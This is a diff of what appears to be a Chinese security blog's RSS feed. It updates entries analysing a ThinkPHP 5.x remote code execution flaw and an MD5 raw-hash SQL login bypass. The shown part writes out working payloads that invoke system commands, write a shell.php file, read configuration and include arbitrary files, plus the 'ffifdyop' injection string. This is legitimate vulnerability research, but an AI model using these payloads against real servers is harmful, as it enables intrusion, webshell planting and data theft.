@@ -52,24 +52,20 @@ Pwn 双边协议1.0 from pwn import* import base64 #context.</description>
 composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10 将 composer.json 文件的 require 字段设置成如下：
 &amp;quot;require&amp;quot;: { &amp;quot;php&amp;quot;: &amp;quot;&amp;gt;=5.4.0&amp;quot;, &amp;quot;topthink/framework&amp;quot;: &amp;quot;5.0.10&amp;quot; }, 然后执行 composer update
 PhpStorm+Xdebug调试环境 可以看我另外一篇文章：Debian下PHP Xdebug调试环境搭建
-框架基本流程 讲的很不错：https://paper.seebug.org/888/#_4
+另外VSCode+Xdebug也是一个不错且方便的选择
+框架基本流程 框架基本流程网上都讲的很清楚，我这里就不搬运了
+这两篇文章讲的很不错：
+https://paper.seebug.org/888/#_4
+https://xz.aliyun.com/t/8143
 RCE-类名解析导致任意类方法调用  ThinkPHP版本：5.0.7&amp;lt;=5.0.x&amp;lt;=5.0.22 、5.1.0&amp;lt;=5.1.x&amp;lt;=5.1.30
-未开启强制路由
 参考：
 https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md
 https://paper.seebug.org/888/#poc
 https://xz.aliyun.com/t/3570
- payload:
+ 概述 本次漏洞存在于 ThinkPHP 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 远程代码执行漏洞 的产生。漏洞影响版本： 5.0.7&amp;lt;=ThinkPHP5&amp;lt;=5.0.22 、5.1.0&amp;lt;=ThinkPHP&amp;lt;=5.1.30。不同版本 payload 需稍作调整：
 5.1.x ：
 ?s=index/\think\Request/input&amp;amp;filter[]=system&amp;amp;data=pwd ?s=index/\think\view\driver\Php/display&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt; ?s=index/\think\template\driver\file/write&amp;amp;cacheFile=shell.php&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt; ?s=index/\think\Container/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id ?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id 5.0.x ：
-?s=index/think\config/get&amp;amp;name=database.username # 获取配置信息 ?s=index/\think\Lang/load&amp;amp;file=../../test.jpg # 包含任意文件 ?s=index/\think\Config/load&amp;amp;file=../../t.php # 包含任意.php文件 ?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id 5.1.x类名解析 2018年12月9日官方发布的补丁，在library/think/route/dispatch/Module.php获取控制器名处加了个一个正则waf
-洞其实不在这里
-在路由调度的时候：
-跟进到thinkphp/library/think/route/dispatch/Module.php:
-跟进controller方法：(thinkphp/library/think/App.php)
-跟进parseModuleAndClass方法：(thinkphp/library/think/App.php)
-这个方法先对$name(类名)进行判断，当$name含有\时会直接将其作为类的命名空间路径，导致我们可以任意方法调用，比如：
- thinkphp/library/think/Container.</description>
+?s=index/think\config/get&amp;amp;name=database.username # 获取配置信息 ?s=index/\think\Lang/load&amp;amp;file=../../test.jpg # 包含任意文件 ?s=index/\think\Config/load&amp;amp;file=../../t.php # 包含任意.</description>
     </item>
     
     <item>
@@ -665,7 +661,7 @@ Padding Oracle Attack 直译为 “填充Oracle攻击” ，这里主要关注�
 第一种方法是将加密后的密码构造出类似 &#39; or &amp;lsquo;1&amp;rsquo; 的形式
 &amp;lt;?php$v = &#39;a&#39;;$payload2 = &amp;quot;&#39;or&#39;&amp;quot;;while(1){$hash = hash(&amp;quot;md5&amp;quot;,$v,true);if(substr_count($hash, $payload2) == 1){die($v); }$v++;}?&amp;gt;这是网上的脚本不过我倒是没跑出来。。。
 这里 $v++ 其实是按照 ascii 字符进行后移的；
-最后可以得到一个结果 ffifdyop
+最后可以得到一个结果 ffifdyop，（还有一个是129581926211651571912466741651878684928）
 将这个加密回去试试，看到确实是&#39;or&#39;的形式
 那么只要我们随意输入一个用户名，密码为 ffifdyop 那么这样我们的语句就变成了：
 select * from users where user = &#39;admin&#39; and password = &#39;&#39;or&#39;6蒥欓!</description>
